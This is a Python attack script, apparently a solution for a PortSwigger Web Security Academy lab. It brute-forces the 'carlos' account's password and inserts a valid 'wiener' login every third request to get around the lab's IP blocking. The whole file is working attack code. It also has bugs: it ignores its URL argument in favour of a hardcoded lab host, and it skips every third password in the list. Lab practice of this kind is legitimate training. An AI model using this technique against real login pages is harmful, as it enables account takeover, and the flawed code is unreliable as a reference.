import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {"http":"https://127.0.0.1:8080","https":"https://127.0.0.1:8080"}

'''
get length of password file - e.g. 100
usernames are 2, carlos and wiener
passwords are 100

Every 3 attempts, we should attempt a wiener login so that IP is not blocked.
e.g.

carlos:pass1
carlos:pass2
carlos:pass3
wiener:peter
carlos:pass1
carlos:pass2
carlos:pass3
wiener_peter
'''
def dodance(url):
    url = "https://ac321f391f76632ec09c92ed000200e3.web-security-academy.net"
    path = "/login"

    loop = 0

    with open('passwords','r') as fpasswords:
        passwords = fpasswords.readlines()
        for p in passwords:
            p = p.strip('\n')
            if loop % 3 == 0:
                params = {'username':'wiener','password':'peter'}
            else:
                params = {'username':'carlos','password':p}
            
            #print (params)
            r = requests.post(url+path, data=params,verify=False, proxies=proxies)
            #print ("Username: "+params['username']+ " , "+ str(r.status_code))

            if params['username']=='carlos' and "Log out" in r.text and "carlos" in r.text:
                print (params)
                break
        
            loop += 1

def main():
    if len(sys.argv) != 2:
        print ("(+) Usage: %s <url> " % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print ("[+] Brute-Forcing login page - Bypassing IP block")

    dodance(url)

if __name__ == "__main__":
    main()